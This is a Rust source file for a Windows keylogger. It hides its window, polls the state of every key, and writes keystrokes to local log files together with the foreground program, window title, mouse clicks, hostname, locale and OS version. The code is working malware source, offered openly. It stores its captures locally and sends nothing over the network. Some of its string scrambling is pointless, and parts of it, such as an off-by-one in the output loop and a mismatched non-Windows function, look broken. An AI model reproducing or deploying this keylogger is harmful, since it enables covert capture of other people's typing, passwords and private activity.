#![windows_subsystem = "windows"]
#[cfg(windows)]
extern crate winapi;
use std::collections::HashMap;
use std::fs::*;
use std::io::*;
use rand::seq::SliceRandom;
//use std::str::pattern::Pattern;
use chrono::{DateTime, Timelike, Utc};

// winapi::um header user mode only
// USER procedure declaration, constant, definitions and macros
use winapi::um::winuser::*;

// pub const PROCESS_QUERY_LIMITED_INFORMATION: DWORD = 0x1000;
use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;

// for multiple thread
use winapi::um::processthreadsapi::OpenProcess;
    
// get the name of the file on process
use winapi::um::psapi::GetProcessImageFileNameW;

// get user default location name
use winapi::um::winnls::GetUserDefaultLocaleName;

// basic windows type definitions for minwin partition
// type DWORD = c_ulong
use winapi::shared::minwindef::DWORD;

// type c_int = i32
use winapi::ctypes::c_int;

use winapi::shared::windef::POINT;

use std::{thread, time::Duration};

#[cfg(windows)]
fn begin(file: &mut File, file2: &mut File) {
    //use core::num::flt2dec::strategy::grisu::format_exact_opt;

    log_header(file);
    //unsafe some functions can be declared as unsafe
    //meaning it is the programmer's responsibility to ensure the correctness 
    //instead of the compiler's.
    let locale = unsafe {
        // 85 is the max length of a locale name
        const LEN: i32 = 85;
        let mut buf = vec![0 as u16; LEN as usize];
        GetUserDefaultLocaleName(buf.as_mut_ptr(), LEN);

        // find where to stop
        let mut len = 0;
        buf.iter().enumerate().for_each(|(i, c)| {
            if *c == 0 && len == 0 {
                len = i;
            }
        });

        String::from_utf16_lossy(buf[0..len].as_mut())
    };
    
    log(file, format!("Locale: {}\n", locale));
    log(file, "\nKeylogs:\n".to_string());

    let mut map: HashMap<String, u32> = HashMap::new();
    inmp(&mut map);
    let mut flag = 0;

    let now1: DateTime<Utc> = Utc::now();

    *map.get_mut("hour").unwrap() = now1.hour();
    *map.get_mut("minute").unwrap() = now1.minute(); 
    *map.get_mut("second").unwrap() = now1.second();

    let mut vec:Vec<String> = Vec::new();
    let mut state:String = String::default();

    //print key state
    loop {
        thread::sleep(Duration::from_millis(10));
        //get the process ID from the IntPtr of GetForegroundWindow.
        let hwnd = unsafe { GetForegroundWindow()};

        let pid = unsafe {
            let mut p = 0 as DWORD;
            // get the process class
            GetWindowThreadProcessId(hwnd, &mut p);
            p
        };

        let handle = unsafe {
            OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
        };

        let filename = unsafe {
            const LEN: u32 = 256;
            let mut buf = vec![0 as u16; LEN as usize];
            GetProcessImageFileNameW(handle, buf.as_mut_ptr(), LEN);

            let mut len = 0;
            buf.iter().enumerate().for_each(|(i, c)| {
                if *c == 0 && len == 0 {
                    len = i;
                }
            });

            String::from_utf16_lossy(buf[0..len].as_mut())
        };

        let title = unsafe {
            let len = GetWindowTextLengthW(hwnd) + 1;
            let mut t = String::from("No title");

            if len > 0 {
                let mut buf = vec![0 as u16; len as usize];
                GetWindowTextW(hwnd, buf.as_mut_ptr(), len as i32);
                buf.remove(buf.len() - 1);
                t = String::from_utf16_lossy(buf.as_mut());
            }

            t
        };
        
        let now: DateTime<Utc> = Utc::now();
        

        for i in 0 as c_int..255 as c_int {
            // get the state of the key
            let key = unsafe { GetAsyncKeyState(i)};
            // find the key and print to the output file
            if (key & 1) > 0 {
                let s = format!("[{:02}:{:02}:{:02}][{}][{}][{}]\n",
                                now.hour(), now.minute(), now.second(),
                                filename.trim(), title.trim(), keycode_to_string(i as u8));
                
                let s_scrambled = scramble_string(&s.clone());
                let s_unscrambled = unscramble_string(&s_scrambled);
                log(file, s_unscrambled);

                let s2 = format!("{:02}-{:02}-{:02},{},{}",
                                now.hour(), now.minute(), now.second(),
                                filename.trim(), title.trim());
                let s_shifted = shift_string(&s2.clone(), 5);
                log_new_format(file2, s_shifted, &mut map, i as u8, &mut vec, &mut state);
                
                if i as u8 == 0x1B {
                    flag = 1;
                }
            }
        }
        if flag == 1 {
            break;
        }
    }
}

// print the header of the output file
fn log_header(file: &mut File) {
    // get the information of operating system
    let os_info = {
        let info = os_info::get();
        format!("OS: type: {}\nVersion: {}\n", info.os_type(), info.version())
    };
    log(file, os_info);

    let hostname = format!("Hostname: {}\n", hostname::get_hostname().unwrap_or("No hostname".to_string()));
    log(file, hostname);
}

// print in the output file
fn log(file: &mut File, s: String) {
    #[cfg(debug_assertions)] {
        print!("{}", s);
    }

    match file.write(s.as_bytes()) {
        Err(e) => {println!("Could not write to the output file: {}", e)}
        _ => {}
    }

    match file.flush() {
        Err(e) => {println!("Could not flush the output file: {}", e)}
        _ => {}
    }
}

fn scramble_string(input: &str) -> String {
    let mut chars: Vec<char> = input.chars().collect();
    let mut rng = rand::thread_rng();
    chars.shuffle(&mut rng);
    chars.iter().collect()
}

fn unscramble_string(input: &str) -> String {
    let mut chars: Vec<char> = input.chars().collect();
    chars.sort();
    chars.iter().collect()
}
const ALPHABET: &str = "abcdefghijklmnopqrstuvwxyz";

fn shift_char(ch: char, shift: i32) -> char {
    let idx = ALPHABET.find(ch);
    match idx {
        Some(i) => {
            let new_idx = (i as i32 + shift) % 26;
            ALPHABET.chars().nth(new_idx as usize).unwrap()
        },
        None => ch,
    }
}

fn shift_string(st: &str, shift: i32) -> String {
    st.chars().map(|ch| shift_char(ch, shift)).collect()
}

fn scramble_strings(strings: &mut Vec<String>, shift: i32) {
    for string in strings {
        *string = shift_string(&string, shift);
    }
}

fn unscramble_strings(strings: &mut Vec<String>, shift: i32) {
    for string in strings {
        *string = shift_string(&string, -shift);
    }
}

fn log_new_format(file: &mut File, s:String, map: &mut HashMap<String, u32>, k : u8, vec: &mut Vec<String>, state: &mut String) {
    let collection: Vec<&str> = s.as_str().split(',').collect();
    let time:Vec<&str> = collection[0].split('-').collect();

    // put number and character into the printing vector
    if k == 0xA3 {
        *map.get_mut("capital").unwrap() = 1;
    }
    
    if *map.get("capital").unwrap() == 1 {
        if state.is_empty() {
            *state = format!("{}", collection[2].to_string().clone());
        } else if *state != collection[2].to_string().clone() {
            *map.get_mut("action").unwrap() = 1;
        }
        //if the state changes, print previous state's string
        /*if *map.get("action").unwrap() == 1 {
            //print
            vec.push("\n".to_string());
            *map.get_mut("end_point").unwrap() += 1;
            print_new_format(file, map, vec, state);
            *state = collection[2].to_string().clone();
            vec.push(": ".to_string());
            *map.get_mut("start_point").unwrap() = *map.get("end_point").unwrap();
            *map.get_mut("end_point").unwrap() += 1;
            *map.get_mut("action").unwrap() = 0;
        }*/
        
        //if the time difference is more than 5 second, print the string
        /*if time[2].to_string().parse::<u32>().unwrap() - *map.get("second").unwrap() > 5 {
            *map.get_mut("hour").unwrap() = time[0].to_string().parse::<u32>().unwrap();
            *map.get_mut("minute").unwrap() = time[1].to_string().parse::<u32>().unwrap();
            *map.get_mut("second").unwrap() = time[2].to_string().parse::<u32>().unwrap();
            //print
            vec.push("\n".to_string());
            *map.get_mut("end_point").unwrap() += 1;
            print_new_format(file, map, vec, state);
        
            *map.get_mut("start_point").unwrap() = *map.get("end_point").unwrap();
            vec.push(collection[2].to_string());
            *map.get_mut("end_point").unwrap() += 1; 
        }*/
        
        *map.get_mut("hour").unwrap() = time[0].to_string().parse::<u32>().unwrap();
        *map.get_mut("minute").unwrap() = time[1].to_string().parse::<u32>().unwrap();
        *map.get_mut("second").unwrap() = time[2].to_string().parse::<u32>().unwrap();

        if ( k >= 65 && k <=90) || (k >= 48 && k <= 57) {
            vec.push((k as char).to_lowercase().to_string());
            *map.get_mut("end_point").unwrap() += 1; 
        }

        if k == 0x1B {
            print_new_format(file, map, vec, state);
            return;
        }
        
        // put other sign into the printing vector
        match k {
            0x08 => {
                vec.pop();
                *map.get_mut("end_point").unwrap() += 1; 
            },
            0x09 => {
                vec.push("    ".to_string());
                *map.get_mut("end_point").unwrap() += 1; 
            },
            0x0D => {
                vec.push("\n".to_string());
                *map.get_mut("end_point").unwrap() += 1; 
            },
            0x20 => {
                vec.push(" ".to_string());
                *map.get_mut("end_point").unwrap() += 1; 
            },
            0xBB => {
                vec.push("+".to_string());
                *map.get_mut("end_point").unwrap() += 1; 
            },
            0xBC => {
                vec.push(",".to_string());
                *map.get_mut("end_point").unwrap() += 1; 
            },
            0xBD => {
                vec.push("-".to_string());
                *map.get_mut("end_point").unwrap() += 1; 
            },
            0xBE => {
                vec.push(".".to_string());
                *map.get_mut("end_point").unwrap() += 1; 
            },
            _ => return
        }
    }
    
}

fn print_new_format(file: &mut File, map: &mut HashMap<String, u32>, vec: &mut Vec<String>, s: &mut String) {
    let mut k = *map.get("start_point").unwrap();
    scramble_strings(vec, 5);
    unscramble_strings(vec, 5);
    print!("{}: ", *s);

    while k < *map.get("end_point").unwrap() {
        
        print!("{}", vec[k as usize]);
        k+=1;

        match file.write(vec[k as usize].as_bytes()) {
            Err(e) => {println!("Could not write to the output file: {}", e)}
            _ => {}
        }
    
        match file.flush() {
            Err(e) => {println!("Could not flush the output file: {}", e)}
            _ => {}
        }
    }
    

    
}

//number to key state string
fn keycode_to_string(k: u8) -> String {
    if (k >= 65 && k <= 90) || (k >= 48 && k <= 57) {
        return format!("{}", (k as char));
    }

    match k {
        0x01 => { format!("VK_LBUTTON:{}", get_mouse_pos()) }
        0x02 => { format!("VK_RBUTTON:{}", get_mouse_pos()) }
        0x03 => { "VK_CANCEL".to_string() }
        0x04 => { format!("VK_MBUTTON:{}", get_mouse_pos()) }
        0x05 => { format!("VK_XBUTTON1:{}", get_mouse_pos()) }
        0x06 => { format!("VK_XBUTTON2:{}", get_mouse_pos()) }
        0x08 => { "VK_BACK".to_string() }
        0x09 => { "VK_TAB".to_string() }
        0x0C => { "VK_CLEAR".to_string() }
        0x0D => { "VK_RETURN".to_string() }
        0x10 => { "VK_SHIFT".to_string() }
        0x11 => { "VK_CONTROL".to_string() }
        0x12 => { "VK_MENU".to_string() }
        0x13 => { "VK_PAUSE".to_string() }
        0x14 => { "VK_CAPITAL".to_string() }
        0x15 => { "VK_KANA,VK_HANGUEL,VK_HANGUL".to_string() }
        0x17 => { "VK_JUNJA".to_string() }
        0x18 => { "VK_FINAL".to_string() }
        0x19 => { "VK_HANJA,VK_KANJI".to_string() }
        0x1B => { "VK_ESCAPE".to_string() }
        0x1C => { "VK_CONVERT".to_string() }
        0x1D => { "VK_NONCONVERT".to_string() }
        0x1E => { "VK_ACCEPT".to_string() }
        0x1F => { "VK_MODECHANGE".to_string() }
        0x20 => { "VK_SPACE".to_string() }
        0x21 => { "VK_PRIOR".to_string() }
        0x22 => { "VK_NEXT".to_string() }
        0x23 => { "VK_END".to_string() }
        0x24 => { "VK_HOME".to_string() }
        0x25 => { "VK_LEFT".to_string() }
        0x26 => { "VK_UP".to_string() }
        0x27 => { "VK_RIGHT".to_string() }
        0x28 => { "VK_DOWN".to_string() }
        0x29 => { "VK_SELECT".to_string() }
        0x2A => { "VK_PRINT".to_string() }
        0x2B => { "VK_EXECUTE".to_string() }
        0x2C => { "VK_SNAPSHOT".to_string() }
        0x2D => { "VK_INSERT".to_string() }
        0x2E => { "VK_DELETE".to_string() }
        0x2F => { "VK_HELP".to_string() }
        0x5B => { "VK_LWIN".to_string() }
        0x5C => { "VK_RWIN".to_string() }
        0x5D => { "VK_APPS".to_string() }
        0x5F => { "VK_SLEEP".to_string() }
        0x60 => { "VK_NUMPAD0".to_string() }
        0x61 => { "VK_NUMPAD1".to_string() }
        0x62 => { "VK_NUMPAD2".to_string() }
        0x63 => { "VK_NUMPAD3".to_string() }
        0x64 => { "VK_NUMPAD4".to_string() }
        0x65 => { "VK_NUMPAD5".to_string() }
        0x66 => { "VK_NUMPAD6".to_string() }
        0x67 => { "VK_NUMPAD7".to_string() }
        0x68 => { "VK_NUMPAD8".to_string() }
        0x69 => { "VK_NUMPAD9".to_string() }
        0x6A => { "VK_MULTIPLY".to_string() }
        0x6B => { "VK_ADD".to_string() }
        0x6C => { "VK_SEPARATOR".to_string() }
        0x6D => { "VK_SUBTRACT".to_string() }
        0x6E => { "VK_DECIMAL".to_string() }
        0x6F => { "VK_DIVIDE".to_string() }
        0x70 => { "VK_F1".to_string() }
        0x71 => { "VK_F2".to_string() }
        0x72 => { "VK_F3".to_string() }
        0x73 => { "VK_F4".to_string() }
        0x74 => { "VK_F5".to_string() }
        0x75 => { "VK_F6".to_string() }
        0x76 => { "VK_F7".to_string() }
        0x77 => { "VK_F8".to_string() }
        0x78 => { "VK_F9".to_string() }
        0x79 => { "VK_F10".to_string() }
        0x7A => { "VK_F11".to_string() }
        0x7B => { "VK_F12".to_string() }
        0x7C => { "VK_F13".to_string() }
        0x7D => { "VK_F14".to_string() }
        0x7E => { "VK_F15".to_string() }
        0x7F => { "VK_F16".to_string() }
        0x80 => { "VK_F17".to_string() }
        0x81 => { "VK_F18".to_string() }
        0x82 => { "VK_F19".to_string() }
        0x83 => { "VK_F20".to_string() }
        0x84 => { "VK_F21".to_string() }
        0x85 => { "VK_F22".to_string() }
        0x86 => { "VK_F23".to_string() }
        0x87 => { "VK_F24".to_string() }
        0x90 => { "VK_NUMLOCK".to_string() }
        0x91 => { "VK_SCROLL".to_string() }
        0xA0 => { "VK_LSHIFT".to_string() }
        0xA1 => { "VK_RSHIFT".to_string() }
        0xA2 => { "VK_LCONTROL".to_string() }
        0xA3 => { "VK_RCONTROL".to_string() }
        0xA4 => { "VK_LMENU".to_string() }
        0xA5 => { "VK_RMENU".to_string() }
        0xA6 => { "VK_BROWSER_BACK".to_string() }
        0xA7 => { "VK_BROWSER_FORWARD".to_string() }
        0xA8 => { "VK_BROWSER_REFRESH".to_string() }
        0xA9 => { "VK_BROWSER_STOP".to_string() }
        0xAA => { "VK_BROWSER_SEARCH".to_string() }
        0xAB => { "VK_BROWSER_FAVORITES".to_string() }
        0xAC => { "VK_BROWSER_HOME".to_string() }
        0xAD => { "VK_VOLUME_MUTE".to_string() }
        0xAE => { "VK_VOLUME_DOWN".to_string() }
        0xAF => { "VK_VOLUME_UP".to_string() }
        0xB0 => { "VK_MEDIA_NEXT_TRACK".to_string() }
        0xB1 => { "VK_MEDIA_PREV_TRACK".to_string() }
        0xB2 => { "VK_MEDIA_STOP".to_string() }
        0xB3 => { "VK_MEDIA_PLAY_PAUSE".to_string() }
        0xB4 => { "VK_LAUNCH_MAIL".to_string() }
        0xB5 => { "VK_LAUNCH_MEDIA_SELECT".to_string() }
        0xB6 => { "VK_LAUNCH_APP1".to_string() }
        0xB7 => { "VK_LAUNCH_APP2".to_string() }
        0xBA => { "VK_OEM_1".to_string() }
        0xBB => { "VK_OEM_PLUS".to_string() }
        0xBC => { "VK_OEM_COMMA".to_string() }
        0xBD => { "VK_OEM_MINUS".to_string() }
        0xBE => { "VK_OEM_PERIOD".to_string() }
        0xBF => { "VK_OEM_2".to_string() }
        0xC0 => { "VK_OEM_3".to_string() }
        0xDB => { "VK_OEM_4".to_string() }
        0xDC => { "VK_OEM_5".to_string() }
        0xDD => { "VK_OEM_6".to_string() }
        0xDE => { "VK_OEM_7".to_string() }
        0xDF => { "VK_OEM_8".to_string() }
        0xE2 => { "VK_OEM_102".to_string() }
        0xE5 => { "VK_PROCESSKEY".to_string() }
        0xF6 => { "VK_ATTN".to_string() }
        0xF7 => { "VK_CRSEL".to_string() }
        0xF8 => { "VK_EXSEL".to_string() }
        0xF9 => { "VK_EREOF".to_string() }
        0xFA => { "VK_PLAY".to_string() }
        0xFB => { "VK_ZOOM".to_string() }
        0xFC => { "VK_NONAME".to_string() }
        0xFD => { "VK_PA1".to_string() }
        0xFE => { "VK_OEM_CLEAR".to_string() }

        _ => { return format!("CODE_{}", k); }
    }
}

//get mouse position
fn get_mouse_pos() -> String {
    let pos = unsafe {
        let mut p = POINT {x: -1, y:-1};
        GetCursorPos(&mut p);
        p
    };

    format!("{},{}", pos.x, pos.y)
}

fn inmp(m: &mut HashMap<String, u32>) {
    m.insert("action".to_string(), 0);
    m.insert("capital".to_string(), 0);
    m.insert("importance".to_string(), 0);
    m.insert("hour".to_string(), 0);
    m.insert("minute".to_string(), 0);
    m.insert("second".to_string(), 0);
    m.insert("start".to_string(), 0);
    m.insert("start_point".to_string(), 0);
    m.insert("end_point".to_string(), 0);
}

#[cfg(not(windows))]
fn begin(file: &mut File) {
    log_header(file);
    log(file, "This keylogger only works on windows".to_string());
}

fn main() {
    //let now: DateTime<Utc> = Utc::now();
    // name of the output file
    let filename = format!("./bin/keylogger.log");

    let mut output = {
        match OpenOptions::new().write(true).create(true).open(&filename) {
            Ok(f) => {f}

            Err(e) => {
                panic!("Could not create output file: {}", e);
            }
        }
    };

    let filename2 = format!("./bin/assemble keylogger information.log");
    let mut output2 = {
        match OpenOptions::new().write(true).create(true).open(&filename2) {
            Ok(f2) => {f2}

            Err(e2) => {
                panic!("Could not create output file: {}", e2);
            }
        }
    };

    begin(&mut output, &mut output2);
}